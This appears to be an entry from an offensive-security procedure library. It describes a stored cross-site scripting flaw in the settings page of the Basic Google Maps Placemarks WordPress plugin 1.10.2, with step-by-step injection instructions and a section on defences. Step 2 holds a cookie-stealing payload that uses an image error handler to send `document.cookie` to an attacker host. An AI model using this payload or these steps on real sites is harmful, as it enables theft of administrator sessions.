---
id: proc-9375-bgmp-xss
tags:
  - xss
  - stored-xss
  - wordpress
  - plugin-vulnerability
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.113Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---
id: proc-9375-bgmp-xss
name: Inject-Stored-XSS-in-BGMP-Plugin-Settings
type: procedure
verified: false
submitted: false
created_at: 2024-01-01T00:00:00Z
updated_at: 2024-01-01T00:00:00Z
tactics: [[Execution]], [[Collection]]
techniques: [[JavaScript]]
sub_techniques: []
tags: xss, stored-xss, wordpress, plugin-vulnerability, javascript-execution
commands: []
platforms: Web, WordPress
tools: []
---

# Inject-Stored-XSS-in-BGMP-Plugin-Settings

## Summary

This procedure exploits a stored Cross-Site Scripting (XSS) vulnerability in the Basic Google Maps Placemarks (BGMP) WordPress plugin by injecting malicious JavaScript into unsanitized settings fields, allowing persistent storage and execution when admins view the page, potentially leading to session hijacking.

## Description

The BGMP plugin in version 1.10.2 fails to sanitize or escape inputs on its admin settings page (`/wp-admin/options-general.php?page=bgmp_settings`), enabling attackers with admin privileges to store arbitrary JavaScript. When another admin loads the page, the script executes in their browser, enabling theft of admin cookies or sessions. This is limited to admin users but can chain to broader compromise. The attack requires admin access and targets PHP/WordPress environments.

## Requirements

1. Administrator credentials for the target WordPress site
2. Access to the web interface (browser) for manual form submission
3. Target running BGMP plugin version 1.10.2 or equivalent vulnerable release

## Defense

Defensive measures and detection strategies:

- Input sanitization: Use WordPress functions like `sanitize_text_field()` for all settings inputs
- Output escaping: Apply `esc_html()` or `wp_kses()` when rendering settings
- Content Security Policy (CSP): Implement strict CSP to block inline scripts
- Admin access controls: Limit plugin settings to super admins and audit changes
- Monitoring: Log admin form submissions and scan for script tags in database options

## Objectives

1. Persist malicious JavaScript in plugin settings for repeated execution
2. Execute code in victim admin browsers to steal sessions or manipulate the DOM
3. Achieve initial compromise escalation within the admin panel

## Instructions

### Step 1: Access the Settings Page

**Context**: Log in as admin and navigate to the vulnerable page to access input fields.

No specific command; use browser to visit `http://www.site.com/wp-admin/options-general.php?page=bgmp_settings`.

> Ensure you are authenticated as an administrator. The page should load the form with fields like map titles or placemark descriptions.

### Step 2: Inject the Malicious Payload

**Context**: Enter JavaScript into any input field, exploiting lack of sanitization.

No specific command; manually input payload in form fields, e.g., `<script>alert('XSS via BGMP');</script>` or `<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>` for exfiltration.

> The fields accept the input without stripping tags. Test with a simple alert to verify.

### Step 3: Save the Injected Settings

**Context**: Submit the form to store the payload in the WordPress database.

No specific command; click the "Save Changes" button on the form.

> Upon submission, the plugin persists the data in `wp_options` table without escaping, confirming save via success message.

### Step 4: Trigger and Verify Execution

**Context**: Reload or have another admin view the page to execute the stored script.

No specific command; access the settings page again in a test browser.

> The script should run immediately upon rendering, e.g., popup or network request to attacker server. Check browser console for errors or use dev tools to inspect executed code.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- xss
- stored-xss
- wordpress
- plugin-vulnerability
- javascript-execution
